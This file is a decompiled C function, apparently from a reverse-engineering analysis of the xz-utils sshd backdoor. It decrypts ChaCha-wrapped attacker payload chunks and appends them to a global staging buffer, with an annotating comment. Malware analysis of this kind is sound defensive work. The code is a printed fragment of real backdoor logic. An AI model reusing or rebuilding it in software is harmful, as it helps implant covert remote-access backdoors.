// /home/kali/xzre-ghidra/xzregh/108D50_decrypt_payload_message.c
// Function: decrypt_payload_message @ 0x108D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall decrypt_payload_message(key_payload_t * payload, size_t payload_size, global_context_t * ctx)


/*
 * AutoDoc: Decrypts a ChaCha-wrapped `key_payload_t` chunk, copies the plaintext body into the global
 * staging buffer when the advertised length fits, and bumps `ctx->current_data_size`. The body
 * is decrypted twice—the second pass keeps the keystream in sync with sshd's original consumer—
 * so later packets can continue appending without tearing, and any failure forces the payload
 * state back to 0xffffffff.
 */
#include "xzre_types.h"


BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_context_t *ctx)

{
  u64 uVar1;
  u8 *puVar2;
  BOOL BVar3;
  ulong uVar4;
  long lVar5;
  ulong uVar6;
  u16 *puVar7;
  int inl;
  u8 output [57];
  size_t header_size;
  backdoor_payload_hdr_t hdr;
  u8 *data;
  undefined8 uStack_69;
  u16 body_length;
  
  data = (u8 *)0x0;
  uStack_69 = 0;
  puVar7 = &body_length;
  for (lVar5 = 0x29; lVar5 != 0; lVar5 = lVar5 + -1) {
    *(undefined1 *)puVar7 = 0;
    puVar7 = (u16 *)((long)puVar7 + 1);
  }
  if (payload == (key_payload_t *)0x0) {
    if (ctx == (global_context_t *)0x0) {
      return FALSE;
    }
  }
  else {
    if (ctx == (global_context_t *)0x0) {
      return FALSE;
    }
    if (ctx->payload_state == 3) {
      return TRUE;
    }
    if ((0x12 < payload_size) && (ctx->payload_state < 2)) {
      *(u64 *)&hdr.field0_0x0 = *(undefined8 *)&payload->field0_0x0;
      hdr.field0_0x0.field1.field_c = *(u64 *)((long)&payload->field0_0x0 + 8);
      BVar3 = secret_data_get_decrypted((u8 *)&data,ctx);
      if (BVar3 != FALSE) {
        puVar7 = &(payload->field0_0x0).field1.body_length;
        inl = (int)payload_size + -0x10;
        BVar3 = chacha_decrypt((u8 *)puVar7,inl,(u8 *)&data,(u8 *)&hdr,(u8 *)puVar7,
                               ctx->imported_funcs);
        if (((BVar3 != FALSE) &&
            (uVar6 = (ulong)(payload->field0_0x0).field1.body_length, uVar6 <= payload_size - 0x12))
           && (uVar1 = ctx->current_data_size, uVar6 < ctx->payload_data_size - uVar1)) {
          puVar2 = ctx->payload_data;
          for (uVar4 = 0; uVar6 != uVar4; uVar4 = uVar4 + 1) {
            puVar2[uVar4 + uVar1] = *(u8 *)((long)&payload->field0_0x0 + uVar4 + 0x12);
          }
          ctx->current_data_size = ctx->current_data_size + uVar6;
          BVar3 = chacha_decrypt((u8 *)puVar7,inl,(u8 *)&data,(u8 *)&hdr,(u8 *)puVar7,
                                 ctx->imported_funcs);
          if (BVar3 != FALSE) {
            return TRUE;
          }
        }
      }
    }
  }
  ctx->payload_state = 0xffffffff;
  return FALSE;
}

